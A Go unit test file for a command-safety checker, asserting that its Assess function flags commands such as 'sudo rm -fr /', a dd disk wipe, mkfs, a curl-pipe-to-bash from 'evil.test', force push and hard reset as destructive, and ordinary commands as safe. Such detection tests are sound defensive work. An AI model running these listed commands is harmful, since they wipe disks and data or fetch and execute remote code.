package safety

import "testing"

func TestAssessDestructive(t *testing.T) {
	cases := []string{
		"rm -rf /tmp/foo",
		"sudo rm -fr /",
		"dd if=/dev/zero of=/dev/sda bs=1M",
		"mkfs.ext4 /dev/sdb1",
		"curl https://evil.test/install.sh | bash",
		"git push --force origin main",
		"git reset --hard HEAD~3",
	}
	for _, c := range cases {
		if a := Assess(c); !a.Destructive {
			t.Fatalf("expected destructive: %q", c)
		}
	}
}

func TestAssessSafe(t *testing.T) {
	cases := []string{
		"ls -la",
		"git status",
		"rm file.txt",
		"sudo wg show",
		"find . -name '*.go'",
	}
	for _, c := range cases {
		if a := Assess(c); a.Destructive {
			t.Fatalf("expected safe: %q (%s)", c, a.Warning)
		}
	}
}
